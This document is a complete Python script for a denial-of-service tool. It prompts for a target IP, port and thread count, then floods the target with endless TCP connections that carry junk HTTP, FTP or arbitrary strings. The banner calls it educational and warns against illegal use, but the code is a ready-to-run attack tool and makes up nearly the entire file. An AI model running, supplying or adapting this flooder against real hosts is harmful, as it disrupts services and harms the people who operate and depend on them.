#!/usr/bin/python3
# use this method only on your private system!!! this method is not for official use
# Developer Rights: ninja

import sys
import socket as s
from threading import Thread

def do_dos():
    while True:
        soc = s.socket(s.AF_INET, s.SOCK_STREAM)
        try:
            soc.connect((ip, port))
            if port == 80:
                soc.send(b'GET not_exist.html HTTP/1.1')

            elif port == 21:
                soc.send(b'USER not_existing')

            else:
                soc.send(b'This is a random string')

            print('[+] Sending DoS packet to {}:{}'.format(ip, port))

        except:
            print('[-] Could not connect to {}:{}'.format(ip, port))
        soc.close()

# البانر (Banner)
def print_banner():
    banner = """
    #######################################################
    #                                                     #
    #  ██████╗  ██████╗ ███████╗    ███████╗██╗███████╗   #
    #  ██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██║██╔════╝   #
    #  ██║  ██║██║   ██║███████╗    █████╗  ██║█████╗     #
    #  ██║  ██║██║   ██║╚════██║    ██╔══╝  ██║██╔══╝     #
    #  ██████╔╝╚██████╔╝███████║    ██║     ██║███████╗   #
    #  ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝╚══════╝   #
    #                                                     #
    #  Developer: ninja                                   #
    #  Usage: For educational purposes only!              #
    #  Do not use this tool for illegal activities.       #
    #                                                     #
    #######################################################
    """
    print(banner)

# عرض البانر
print_banner()

# طلب المدخلات من المستخدم
ip = input("Enter the target IP address: ")
port = int(input("Enter the target port (e.g., 80 for HTTP, 21 for FTP): "))
threads = int(input("Enter the number of threads: "))

print('[+] Running DoS attack {}:{} with {} threads'.format(ip, port, threads))
print('Developer Rights: ninja')
for i in range(0, threads):
    t = Thread(target=do_dos)
    t.start()